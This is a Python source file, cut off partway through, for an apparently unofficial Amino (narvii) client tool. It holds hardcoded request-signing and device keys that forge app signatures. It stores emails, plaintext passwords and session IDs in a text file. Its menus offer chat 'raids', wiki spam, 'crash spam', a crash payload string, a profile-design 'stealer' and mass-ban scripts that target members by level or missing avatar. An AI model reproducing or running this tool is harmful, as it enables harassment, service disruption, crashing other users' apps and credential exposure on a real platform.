from time import sleep as sl
from colored import fore
from os import system as s

import os
import json
import time
import requests
from hmac import new
from typing import Union
from hashlib import sha1
from base64 import b64encode
from threading import Thread

from random import choice
from datetime import datetime
import string
import hmac
from os import urandom
from time import time as timestamp

class Generator():
    def __init__(self):
    	PREFIX = bytes.fromhex("42")
    	SIG_KEY = bytes.fromhex("F8E7A61AC3F725941E3AC7CAE2D688BE97F30B93")
    	DEVICE_KEY = bytes.fromhex("02B258C63559D8804321C5D5065AF320358D366F")\


    def deviceId(self):
        try:
            with open("device.json", "r") as stream:
                data = json.load(stream)
        except (FileNotFoundError, json.decoder.JSONDecodeError):
            device = self.generate_device_info()
            with open("device.json", "w") as stream:
                json.dump(device, stream, indent=4)
            with open("device.json", "r") as stream:
                data = json.load(stream)
        return data


    def generate_device_info(self):
        identifier = urandom(20)
        key = bytes.fromhex("02B258C63559D8804321C5D5065AF320358D366F")
        mac = hmac.new(key, bytes.fromhex("42") + identifier, sha1)
        device = f"42{identifier.hex()}{mac.hexdigest()}".upper()
        return {
            "device_id": device,
            "user_agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/beyond1qlteue-user 5; com.narvii.amino.master/3.5.33562)"
        }

    def signature(self, data) -> str:
        try: dt = data.encode("utf-8")
        except Exception: dt = data
        mac = new(bytes.fromhex("F8E7A61AC3F725941E3AC7CAE2D688BE97F30B93"), dt, sha1)
        return b64encode(bytes.fromhex("42") + mac.digest()).decode("utf-8")



class headers():
	def __init__(self, data = None, content_type = None, deviceId: str = None, sid: str = None):
		self.device = Generator().deviceId()
		self.User_Agent = self.device["user_agent"]
		self.sid = sid
		if deviceId!=None:self.device_id = deviceId
		else:self.device_id = self.device["device_id"]


		self.headers = {
			"NDCDEVICEID": self.device_id,
			"Accept-Language": "en-US",
			"Content-Type": "application/json; charset=utf-8",
			"User-Agent": self.User_Agent,
			"Host": "service.narvii.com",
			"Accept-Encoding": "gzip",
			"Connection": "Upgrade"
		}

		if data is not None:
			self.headers["Content-Length"] = str(len(data))
			self.headers["NDC-MSG-SIG"] = Generator().signature(data=data)
		if self.sid is not None:
			self.headers["NDCAUTH"] = f"sid={self.sid}"
		if content_type is not None:
			self.headers["Content-Type"] = content_type

class web_headers():
	def __init__(self,	referer: str, sid: str = None):
		self.sid = sid
		self.referer = referer
		self.headers = {
			"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/73.0.3683.86 Chrome/73.0.3683.86 Safari/537.36",
			"content-type": "application/json",
			"x-requested-with": "xmlhttprequest",
			"cookie": f"sid={self.sid}",
			"referer": self.referer
		}





class LIB:
    def __init__(self, proxies: dict = None, deviceId: str = None):
        self.api = "https://service.narvii.com/api/v1"
        self.email = 'Guest'
        self.headersType = 'app'
        self.proxies = proxies
        self.uid = None
        self.sid = None
        self.session = requests.Session()
        self.web_api = "https://aminoapps.com/api"
        if deviceId:self.deviceId=deviceId
        else:self.deviceId=Generator().deviceId()['device_id']

    def parser(self, header_type: str = "app", data = None, content_type: str = None, referer: str = None):
        if header_type == 'app':return headers(data=data, content_type=content_type, deviceId=self.deviceId, sid=self.sid).headers
        elif header_type == 'web':return web_headers(referer=referer, sid=self.sid).headers
        else:return headers(data=data, content_type=content_type, deviceId=self.deviceId, sid=self.sid).headers




    def login(self, email: str, password: str):

        data = json.dumps({
            "email": email,
            "v": 2,
            "secret": f"0 {password}",
            "deviceID": self.deviceId,
            "clientType": 100,
            "action": "normal",
            "timestamp": int(timestamp() * 1000)
        })
        with self.session.post(f"{self.api}/g/s/auth/login",  headers=self.parser(data=data), data=data, proxies=self.proxies) as response:
            if response.status_code != 200: raise Exception(json.loads(response.text))
            else:json_response = json.loads(response.text)
        self.sid = json_response["sid"]
        self.uid = json_response["account"]["uid"]
        if 'Sessions.txt' not in os.listdir():open('Sessions.txt', 'w')
        with open('Sessions.txt', 'r') as file:
            text =f"{file.read()}\n{email} {password} {self.sid} {self.uid}"
            file.close()
        with open('Sessions.txt', 'w') as file:
            file.write(text)
            file.close()
        return self.uid


    def logout(self):

        data = json.dumps({
        "deviceID": self.deviceId,
        "clientType": 100,
        "timestamp": int(timestamp() * 1000)
        })
        response = self.session.post(f"{self.api}/g/s/auth/logout", headers=self.parser(data=data), data=data, proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else:
            self.sid = None
            self.uid = None
            self.email = 'Guest'
        return response.status_code



    def get_account_info(self):

        response = self.session.get(f"{self.api}/g/s/account", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: information_from_the_server = json.loads(response.text)["account"]


        info = {
            "sid": self.sid,
            "uid": self.uid,
            "other": information_from_the_server

        }
        return info


    def get_from_link(self, link: str):


        response = self.session.get(f"{self.api}/g/s/link-resolution?q={link}", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)["linkInfoV2"]



    def get_community_members(self, comId: str,  type: str = "recent", start: int = 0, size: int = 25):


        if type == "recent": response = self.session.get(f"{self.api}/x{comId}/s/user-profile?type=recent&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        elif type == 'online': response = self.session.get(f"{self.api}/x{comId}/s/live-layer?topic=ndtopic:x{comId}:online-members&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        elif type == "banned": response = self.session.get(f"{self.api}/x{comId}/s/user-profile?type=banned&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        elif type == "featured": response = self.session.get(f"{self.api}/x{comId}/s/user-profile?type=featured&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        elif type == "leaders": response = self.session.get(f"{self.api}/x{comId}/s/user-profile?type=leaders&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        elif type == "curators": response = self.session.get(f"{self.api}/x{comId}/s/user-profile?type=curators&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)



    def get_my_communities(self, start: int = 0, size: int = 25):

        response = self.session.get(f"{self.api}/g/s/community/joined?v=1&start={start}&size={size}", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)["communityList"]



    def get_user_info(self, userId: str, comId: str = None):


        if comId!=None:
            response = self.session.get(f"{self.api}/x{comId}/s/user-profile/{userId}", headers=self.parser(), proxies=self.proxies)
            if response.status_code != 200: raise Exception(json.loads(response.text))
            else: return json.loads(response.text)["userProfile"]

        response = self.session.get(f"{self.api}/g/s/user-profile/{userId}", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)["userProfile"]



    def ban(self, comId: str, userId: str, reason: str, banType: int = None):
        data = {
            "reasonType": banType,
            "note": {
                "content": reason
            },
            "timestamp": int(timestamp() * 1000)
        }

        response = self.session.post(f"{self.api}/x{comId}/s/user-profile/{userId}/ban", headers=self.parser(data=json.dumps(data)), data=json.dumps(data), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)



    def get_chat_thread(self, chatId: str, start: int = 0, size: int = 25, comId: str = None):
        if comId!=None:
            response = self.session.get(f"{self.api}/x{comId}/s/chat/thread/{chatId}", headers=self.parser(), proxies=self.proxies)
            if response.status_code != 200:raise Exception(json.loads(response.text))
            else: return json.loads(response.text)["thread"]

        response = self.session.get(f"{self.api}/g/s/chat/thread/{chatId}", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: return json.loads(response.text)["thread"]


    def change_profile(self, comId: str, name: str = None, content: str = None):
        data = {"timestamp": int(timestamp() * 1000)}
        if name!=None: data["nickname"] = name
        if content!=None: data["content"] = content
        data = json.dumps(data)
        response = self.session.post(f"{self.api}/x{comId}/s/user-profile/{self.uid}", headers=self.parser(data=data), data=data, proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else:return response.status_code


    def join_community(self, comId: str, invitationId: str = None):

        data = {"timestamp": int(timestamp() * 1000)}
        if invitationId: data["invitationId"] = invitationId

        data = json.dumps(data)
        response = self.session.post(f"{self.api}/x{comId}/s/community/join", data=data, headers=self.parser(data=data), proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: response.status_code


    def leave_community(self, comId: str):

        response = self.session.post(f"{self.api}/x{comId}/s/community/leave", headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: response.status_code


    def send_message_web(self, chatId: str, comId: str, message: str, messageType: int = 0):

        data = {
            "ndcId": f"x{comId}",
            "threadId": chatId,
            "message": {
                "content": message,
                "mediaType": 0,
                "type": messageType,
                "sendFailed": False,
                "clientRefId": 0
            }
        }
        data = json.dumps(data)
        response = self.session.post(f"https://aminoapps.com/api/add-chat-message",headers=self.parser(referer=f"https://aminoapps.com/partial/main-chat-window?ndcId={comId}", header_type='web'),data=data, proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: return response.status_code


    def start_chat(self, userId: Union[str, list], message: str, comId:str = None, title: str = None, content: str = None, isGlobal: bool = False, publishToGlobal: bool = False):
        if isinstance(userId, str): userIds = [userId]
        elif isinstance(userId, list): userIds = userId

        data = {
            "title": title,
            "inviteeUids": userIds,
            "initialMessageContent": message,
            "content": content,
            "timestamp": int(timestamp() * 1000)
        }

        if isGlobal == True:
            data["type"] = 2
            data["eventSource"] = "GlobalComposeMenu"
        else:data["type"] = 0

        if publishToGlobal == True:data["publishToGlobal"] = 1
        else:data["publishToGlobal"] = 0

        data = json.dumps(data)

        if comId!=None:response = self.session.post(f"{self.api}/x{comId}/s/chat/thread", data=data, headers=self.parser(data=data), proxies=self.proxies)
        else:response = self.session.post(f"{self.api}/g/s/chat/thread", data=data, headers=self.parser(data=data), proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: return json.loads(response.text)["thread"]



    def join_chat_web(self, chatId: str, comId: str):

        data = {
        	"ndcId": f"x{comId}",
        	"threadId": chatId
        }
        data = json.dumps(data)
        response = self.session.post(f"https://aminoapps.com/api/join-thread", headers=self.parser(referer=f"https://aminoapps.com/partial/main-chat-window?ndcId={comId}", header_type='web'), data=data, proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: return response.status_code


    def leave_chat_web(self, chatId: str, comId: str):


        data = {
        	"ndcId": f"x{comId}",
        	"threadId": chatId
        }
        data = json.dumps(data)
        response = self.session.post(f"https://aminoapps.com/api/leave-thread", headers=self.parser(referer=f"https://aminoapps.com/partial/main-chat-window?ndcId={comId}", header_type='web'), data=data, proxies=self.proxies)
        if response.status_code != 200:raise Exception(json.loads(response.text))
        else: return response.status_code



    def post_wiki(self, comId: str, title: str, content: str, icon: str = None, imageList: list = None, keywords: str = None, backgroundColor: str = None, fansOnly: bool = False):
        mediaList = []
        if imageList!=None:
            for image in imageList:
                mediaList.append([100, self.upload_media(image, "image"), None])

        data = {
            "label": title,
            "content": content,
            "mediaList": mediaList,
            "eventSource": "GlobalComposeMenu",
            "timestamp": int(timestamp() * 1000)
        }

        if icon: data["icon"] = icon
        if keywords: data["keywords"] = keywords
        if fansOnly: data["extensions"] = {"fansOnly": fansOnly}
        if backgroundColor: data["extensions"] = {"style": {"backgroundColor": backgroundColor}}
        data = json.dumps(data)

        response = self.session.post(f"{self.api}/x{comId}/s/item", headers=self.parser(data=data), data=data, proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return response.status_code



    def get_chat_messages(self, comId, chatId: str, size: int = 25, pageToken: str = None):
        if pageToken is not None: url = f"{self.api}/x{comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&pageToken={pageToken}&size={size}"
        else: url = f"{self.api}/x{comId}/s/chat/thread/{chatId}/message?v=2&pagingType=t&size={size}"

        response = self.session.get(url, headers=self.parser(), proxies=self.proxies)
        if response.status_code != 200: raise Exception(json.loads(response.text))
        else: return json.loads(response.text)



error_color = fore.RED
successful_color = fore.GREEN
regular_color = fore.GREY_63
input_color = fore.DEEP_SKY_BLUE_2
process = False
crash = """
_(.a={}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{},=💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥💻💥)_
"""

start = f"""
{error_color}

╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╭━╮╭━━━╮╱╱╱╱╭╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱┃╭╯┃╭━╮┃╱╱╱╱┃┃
┃╰━━┳╮╱╭┳━━╮╭━━┳╯╰╮┃┃╱╰╋━━┳━╯┃
┃╭━━┫┃╱┃┃┃━┫┃╭╮┣╮╭╯┃┃╭━┫╭╮┃╭╮┃
┃╰━━┫╰━╯┃┃━┫┃╰╯┃┃┃╱┃╰┻━┃╰╯┃╰╯┃
╰━━━┻━╮╭┻━━╯╰━━╯╰╯╱╰━━━┻━━┻━━╯
╱╱╱╱╭━╯┃
╱╱╱╱╰━━╯

        Bᴇᴛᴀ Eᴅɪᴛɪᴏɴ

    MADE BY Xsarz (Telegram -> @DXsarz)

    GitHub: https://github.com/xXxCLOTIxXx
    Telegram channel: https://t.me/DxsarzUnion
    YouTube: https://www.youtube.com/channel/UCNKEgQmAvt6dD7jeMLpte9Q
    Discord server: https://discord.gg/GtpUnsHHT4

      !! Type "help"


{regular_color}
"""

def clear():
    s("clear || cls")
    print(start)

clear()
client = LIB()
clear()

def date_now(): return str(datetime.now()).split(" ")[0].replace("-", ".")

def time_now(): return str(datetime.now()).split(" ")[1].split(".")[0]

def create_time(): return f'{date_now()} - {time_now()}'


def log(text):
    if 'LOG.txt' not in os.listdir():open('LOG.txt', 'w')
    with open('LOG.txt', 'r') as file:
        log = file.read()
        file.close()
    with open('LOG.txt', 'w') as file:
        file.write(f"{log}\n[{create_time()}] {text}")
        file.close()



def help(command):
    scom = command.split(" ")
    colors =f"""
    {error_color}RED{regular_color} - Works only with authorization.
    {input_color}BLUE{regular_color} - Any commands (can also work in guest mode).
    {successful_color}====================================================={regular_color}

    """
    main_help = f"""{colors}
    {input_color}clear{regular_color} - Clear console.
    {input_color}exit{regular_color} - Close program.
    {input_color}login{regular_color} - Login (You can immediately write mail and password separated by a space, or you can enter only a command).
    {input_color}logout{regular_color} - Logout and switch to guest mode.
    {input_color}cl-sessions{regular_color} - Delete recent sessions.
    {error_color}session{regular_color} - Get session information.
    {error_color}ban{regular_color} - Run ban tool.
    {error_color}decor{regular_color} - Decor stealer.
    {error_color}antiban{regular_color} - Set / Remove crash description.

    {successful_color}-help[1/3]-{regular_color}
    """

    help2=f"""{colors}
    {input_color}proxy{regular_color} - view proxy.
    {input_color}proxy set{regular_color} - Set proxy.
    {input_color}proxy del{regular_color} - Delete proxy.
    {input_color}log{regular_color} - See logs.
    {input_color}log del{regular_color} - Clear logs.
    {input_color}protocol stop{regular_color} - Stop protocol execution.
    {error_color}join com{regular_color} - Join the community.
    {error_color}leave com{regular_color} - Leave the community.
    {error_color}online{regular_color} - View online communities.

    {successful_color}-help[2/3]-{regular_color}
    """

    help3=f"""{colors}

    {error_color}protocol 1{regular_color} - Private piar.
    {error_color}protocol 2{regular_color} - Join-Leave raid. (Doesn't work well)
    {error_color}protocol 3{regular_color} - Simple raid.
    {error_color}protocol 4{regular_color} - Wiki spam. (Doesn't work long)
    {error_color}protocol 5{regular_color} - Crash spam.

    {successful_color}-help[3/3]-{regular_color}
    """

    protocolInfo = f"""
    {successful_color}======= Protocols ======={regular_color}
    protocol 1 - Private piar.
    protocol 2 - Join-Leave raid. (Doesn't work well)
    protocol 3 - Simple raid.
    protocol 4 - Wiki spam. (Doesn't work long)
    protocol 5 - Crash spam.
    """

    if command == 'help 2':print(help2)
    elif command == 'help 3':print(help3)
    elif command == 'protocol':print(protocolInfo)
    else:print(main_help)



def getComId():
    communities=list()
    for num, my_communities in  enumerate(client.get_my_communities(size=1000), 1): print(f'\n{num})',my_communities['name']); communities.append(my_communities)
    try:
        selected_community = int(input(f'\n{input_color}Select community #~ {regular_color}'))-1
        return communities[selected_community]['ndcId']
    except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n");getComId()
    except IndexError:print(f"{error_color}\nNumber not found{regular_color}\n");getComId()
    except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n");getComId()



def auth():
    try:email=input(f"{input_color}Email #~ {regular_color}");client.login(email=email, password=input(f"{input_color}Password #~ {regular_color}"));client.email = email
    except Exception as error:print(f"{error_color}\nError login:\n{error}{regular_color}\n");auth()

def session_auth():
    with open('Sessions.txt', 'r') as sessions:
        accounts = sessions.read().split("\n")
        del accounts[0]
        for i in range(len(accounts)):
            email = accounts[i][0:accounts[i].find(' ')]
            print(f'{i+1}) {email}')
        while True:
            num = input(f"{input_color}Select mail #~ {regular_color}")
            try:
                account = accounts[int(num)-1].split(" ")
                client.login(email=account[0], password=account[1])
                client.email = account[0]
                break
            except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n")
            except IndexError:print(f"{error_color}\nNumber not found{regular_color}\n")
            except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")


def auth_type():
    try:
        if 'Sessions.txt' not in os.listdir():
            email = input(f"{input_color}Email #~ {regular_color}")
            client.login(email=email, password=input(f"{input_color}Password #~ {regular_color}"));client.email = email
        else:
            if open('Sessions.txt', 'r').read() != '':
                while True:
                    login_type = input(f"1)Sign in to your account from recent sessions\n2)Simple login\n{input_color}Сhoose a login method #~ {regular_color}")
                    if login_type == '2':auth();break
                    elif  login_type == '1':session_auth();break
                    else:print(f"{error_color}\nChoose a login method{regular_color}\n")
            else:
                email = input(f"{input_color}Email #~ {regular_color}")
                client.login(email=email, password=input(f"{input_color}Password #~ {regular_color}"));client.email = email
    except Exception as error:print(f"{error_color}\nError\n{error}{regular_color}\n");auth_type()



def ban_tools():
    def banLink():
        try:
            url = input(f'\n{input_color}Enter user link #~ {regular_color}')
            comId = client.get_from_link(url)["extensions"]["linkInfo"]["ndcId"]
            userId = client.get_from_link(url)["extensions"]["linkInfo"]["objectId"]
            info = client.get_user_info(userId=userId, comId=comId)
            nick = info["nickname"]
            lvl = info["level"]
            client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
            print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()


    def banUid():
        try:
            comId = getComId()
            userId = input(f'\n{input_color}Enter user Id #~ {regular_color}')
            info = client.get_user_info(userId=userId, comId=comId)
            nick = info["nickname"]
            lvl = info["level"]
            client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
            print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()


    def banNick():
        try:
            nicks = list()
            while True:
                input_nick = input(f'\n{input_color}Leave the field empty to start banning\nEnter a nickname to add it to the targets #~ {regular_color}')
                if input_nick == '':break
                else:nicks.append(input_nick)
            if nicks != []:
                comId=getComId()
                for i in range(3):
                    users = client.get_community_members(comId=comId, size=100)["userProfileList"]
                    for i in range(len(users)):
                        nick = users[i]['nickname']
                        userId = users[i]['uid']
                        lvl = users[i]['level']
                        if nick in nicks:
                            try:
                                client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
                                print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
                            except Exception as error:print(f"{error_color}\n[{nick} | {userId}] Ban error:\n{error}{regular_color}\n")
                print(f"\n{successful_color}Finish.{regular_color}\n");sl(1)
            else:print(f"{error_color}\nError: {regular_color}\n")

        except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n")
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()


    def banSelectedUser(type):
        try:
            comId = getComId()
            if type == '2':
                users = list()
                num=100
                for i in range(10):users+=client.get_community_members(comId=comId, size=num)["userProfileList"];num+=100
            elif type == '1':users = client.get_community_members(comId=comId, size=100, type='online')["userProfileList"]
            if users == []:print(f"{error_color}\nNobody online{regular_color}\n")
            else:
                for i in range(len(users)):
                	nick = users[i]['nickname']
                	userId = users[i]['uid']
                	print(f'{i+1}){nick} | {userId}')
                while True:
                    try:
                        num = int(input(f'\n{input_color}Select user #~ {regular_color}'))-1
                        nickname = users[num]['nickname']
                        userId = users[num]['uid']
                        client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
                        print(f"\n{successful_color}|{nickname} | {userId} | successfully banned.{regular_color}\n");sl(1);break
                    except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n")
                    except IndexError:print(f"{error_color}\nNumber not found{regular_color}\n")
                    except Exception as error:print(f"{error_color}\n[{nick} | {userId}] Ban error:\n{error}{regular_color}\n");break
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()

    def banLvl():
        try:
            max_lvl = int(input(f'\n{input_color}Enter the level up to which everyone will be banned inclusive #~ {regular_color}'))
            if max_lvl < 1 or max_lvl > 19:print(f"{error_color}\nError: Valid numbers are from 1 to 19.{regular_color}\n");banLvl()
            else:
                comId=getComId()
                for i in range(3):
                    users = client.get_community_members(comId=comId, size=100)["userProfileList"]
                    for i in range(len(users)):
                        nick = users[i]['nickname']
                        userId = users[i]['uid']
                        lvl = users[i]['level']
                        if max_lvl >= lvl:
                            try:
                                client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
                                print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
                            except Exception as error:print(f"{error_color}\n[{nick} | {userId}] Ban error:\n{error}{regular_color}\n")
                print(f"\n{successful_color}Finish.{regular_color}\n");sl(1)
        except ValueError:print(f"{error_color}\nPlease enter a number{regular_color}\n");banLvl()
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()

    def banManySymbols():
        try:
            comId=getComId()
            for i in range(3):
                users = client.get_community_members(comId=comId, size=100)["userProfileList"]
                for i in range(len(users)):
                    nick = users[i]['nickname']
                    userId = users[i]['uid']
                    lvl = users[i]['level']
                    bio = users[i]['content']
                    if bio != None:
                        if len(bio) > 5000:
                            try:
                                client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
                                print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
                            except Exception as error:print(f"{error_color}\n[{nick} | {userId}] Ban error:\n{error}{regular_color}\n")
            print(f"\n{successful_color}Finish.{regular_color}\n");sl(1)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()

    def avaBan():
        try:
            comId=getComId()
            for i in range(3):
                users = client.get_community_members(comId=comId, size=100)["userProfileList"]
                for i in range(len(users)):
                    nick = users[i]['nickname']
                    userId = users[i]['uid']
                    lvl = users[i]['level']
                    if users[i]['icon'] is None:
                        try:
                            client.ban(userId=userId, reason="Ban script @DXsarz", comId=comId)
                            print(f"\n{successful_color}|{nick} | {userId} | {lvl} level | successfully banned.{regular_color}\n");sl(1)
                        except Exception as error:print(f"{error_color}\n[{nick} | {userId}] Ban error:\n{error}{regular_color}\n")
            print(f"\n{successful_color}Finish.{regular_color}\n");sl(1)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")
        chooseMethod()


    def chooseMethod():
        method = input(f"""
{successful_color}================ BAN TOOL ================

    {error_color}= stop - go to main menu =

1)Ban by link
2)Ban by uid
3)Ban everyone with matching nickname
4)Ban by last / online users
5)Ban by level
6)Ban anyone with a lot of characters in their description
7)Ban everyone who doesn't have an avatar
{input_color}Choose a ban method #~ {regular_color}""")
        if method == '1':banLink()
        elif method == '2':banUid()
        elif method == '3':banNick()
        elif method == '4':
            while True:
                type = input(f"\n1)Select online users\n2)Select last joined users\n{input_color}Select type #~ {regular_color}")
                if type == '1':banSelectedUser(type='1');break
                elif type == '2': banSelectedUser(type='2');break
                else:print(f"\n{error_color}Choose one of the proposed types{regular_color}\n");sl(1)
        elif method == '5':banLvl()
        elif method == '6':banManySymbols()
        elif method == '7':avaBan()
        elif method.lower() == 'clear':clear();chooseMethod()
        elif method.lower() ==  'stop':mainProcess()
        else:print(f"\n{error_color}Invalid method, please select one of the suggested methods{regular_color}\n");sl(1);chooseMethod()



    if client.email == 'Guest':print(f"\n{error_color}You are not logged in.{regular_color}\n")
    else:chooseMethod()


def decor_tools():

    def name_generator(num: int = 8):
    	g = ""
    	for x in range(num):
    		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
    	return g

    def profile_design():
        try:
            link_info = client.get_from_link(input(f"{input_color}Link to profile #~ {regular_color}"))['extensions']['linkInfo']
            info = client.get_user_info(userId=link_info['objectId'], comId=link_info['ndcId'])
            name = info["nickname"]
            icon = info["icon"]
            try:background = info["extensions"]["style"]["backgroundMediaList"][1]
            except: background = "None"
            try:content = info["content"]
            except:content = "None"
            try:mediaList = info["mediaList"]
            except: mediaList = "None"
            total = f'Name: {name}\nIcon: {icon}\nBackground image: {background}\nContent:\n\n{content}\nMedia List: {mediaList}'
            file_name = f"profile_{name_generator()}.txt"
            file = open(file_name, "w+", encoding="utf-8")
            file.write(total)
            print(successful_color, f'Design saved to file "{file_name}"', regular_color)
        except Exception as error:print(f"{error_color}\nError:\n{error}{regular_color}\n")


    def community_design():
        try:
            info = client.get_from_link(input(f"{input_color}Community Link #~ {regular_color}"))["extensions"]["community"]
            name = info['name']
            icon = info['icon']
            content = info['content']
            mediaList = ['mediaList']
